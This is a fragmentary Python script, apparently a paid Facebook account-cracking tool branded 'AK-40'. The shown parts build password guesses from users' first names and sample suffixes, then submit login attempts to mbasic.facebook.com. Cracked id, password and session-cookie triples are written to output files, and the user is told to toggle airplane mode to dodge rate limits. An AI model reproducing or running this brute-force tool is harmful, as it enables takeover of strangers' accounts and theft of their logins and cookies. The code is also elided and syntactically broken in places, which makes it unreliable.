...
def uaku():
	try:
		...
		a=requests.get('https://github.com/AK-40/PAID-TOOLS/blob/main/mix.txt).text
		ua=open('.mix.txt','w')
...
def banner():
	print(f"""    
  FUCK YOUR SYSTEM 
  BYPASS TEAM KING-S.D.S 

                                                                                                               
               AAA               KKKKKKKKK    KKKKKKK                        444444444       000000000          
              A:::A              K:::::::K    K:::::K                       4::::::::4     00:::::::::00        
             A:::::A             K:::::::K    K:::::K                      4:::::::::4   00:::::::::::::00      
            A:::::::A            K:::::::K   K::::::K                     4::::44::::4  0:::::::000:::::::0     
           A:::::::::A           KK::::::K  K:::::KKK                    4::::4 4::::4  0::::::0   0::::::0     
          A:::::A:::::A            K:::::K K:::::K                      4::::4  4::::4  0:::::0     0:::::0     
         A:::::A A:::::A           K::::::K:::::K                      4::::4   4::::4  0:::::0     0:::::0     
        A:::::A   A:::::A          K:::::::::::K      --------------- 4::::444444::::4440:::::0 000 0:::::0     
       A:::::A     A:::::A         K:::::::::::K      -:::::::::::::- 4::::::::::::::::40:::::0 000 0:::::0     
      A:::::AAAAAAAAA:::::A        K::::::K:::::K     --------------- 4444444444:::::4440:::::0     0:::::0     
     A:::::::::::::::::::::A       K:::::K K:::::K                              4::::4  0:::::0     0:::::0     
    A:::::AAAAAAAAAAAAA:::::A    KK::::::K  K:::::KKK                           4::::4  0::::::0   0::::::0     
   A:::::A             A:::::A   K:::::::K   K::::::K                           4::::4  0:::::::000:::::::0     
  A:::::A               A:::::A  K:::::::K    K:::::K                         44::::::44 00:::::::::::::00      
 A:::::A                 A:::::A K:::::::K    K:::::K                         4::::::::4   00:::::::::00        
AAAAAAA                   AAAAAAAKKKKKKKKK    KKKKKKK                         4444444444     000000000          
                                                                                                                                                                                    
      TOR ABBU RE MONE RAKHIS
        S.D.S SPMMING MANE BRAND 
...
def chk():
  ...
  print(logo)
  print('\033[94m[•]\033[97mMY TOOLS ARE PAID')
  ...
  try: 
    httpCaht = requests.get("https://github.com/AK-40/PAID-TOOLS/blob/main/Sata_ok.txt").text 
    if id in httpCaht: 
      ...
      print('\033[92m[•]\033[97mMY ID : AJMIR HOSSAIN [ AK-40 ]')
...
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			print(f' \x1b[1;92m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     Example: /sdcard/AK-40.txt     \033[40m\033[00m')
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :AK-40 = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :AK-40 = ' ~> 2009'
        elif uid[:8] in ['10000000']        :AK-40 = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:AK-40 = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:AK-40 = ' 2010'
        elif uid[:6] in ['100001']          :AK-40 = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :AK-40 = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :AK-40 = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :AK-40 = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :AK-40 = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :AK-40 = ' ~> 2015'
        elif uid[:5] in ['10001']           :AK-40 = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :AK-40 = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :AK-40 = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :AK-40 = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :AK-40 = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:AK-40 = ' ~> 2021'
        elif uid[:5] in ['10008']           :AK-40 = ' ~>2022'
        elif uid[:5] in ['10009']           :AK-40 = ' ~> 2023'
        else:hasan=''
...
def passwrd():
	...
	print(f' Results OK Saved In :AK-40_OK.txt')
	print(f' Results CP Saved In :CP.txt')
	print(f' Play Airplane Mode Any 1k Idz\r')
	print('══════════════════════════════════════════')
	#print(f"\x1b[1;91m [➡️] \x1b[1;92m TODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	#print(f"\x1b[1;91m [➡️] \x1b[1;92m TODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	#print(f"\x1b[1;91m [➡️] \x1b[1;91m NOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
	p#rint(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMr Ajmir.Hossain\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●\n')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+'1233')
					pwv.append(frs+'0978')
					pwv.append(frs+'rasel@@')
					pwv.append(frs+'Rony123@')
					pwv.append(frs+'rony123@')
					pwv.append(frs+'@#%*@৳+')
					pwv.append(nmf+'2023')
			if 'ya' in pwpluss:
...
def crack(idf,pwv):
	global loop,ok,cp
	#sys.stdout.write(f'\r \33[1;94m[AK-40\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(ok))),
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \33[1;95m[AK-40]  {h}[{kk}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
    ...
    # 'cookie': 'datr=UYVEZchmSs2e1RoDcW_3dEXy; sb=UYVEZRy9bDvJYBDD7X0WOpw7',
    'dpr': '2.75',
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('AK-40_CP.txt' , 'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				open('AK-40_OK.txt' , 'a').write(idf+'|'+pw+'|'+ua+kuki+'\n')
				break
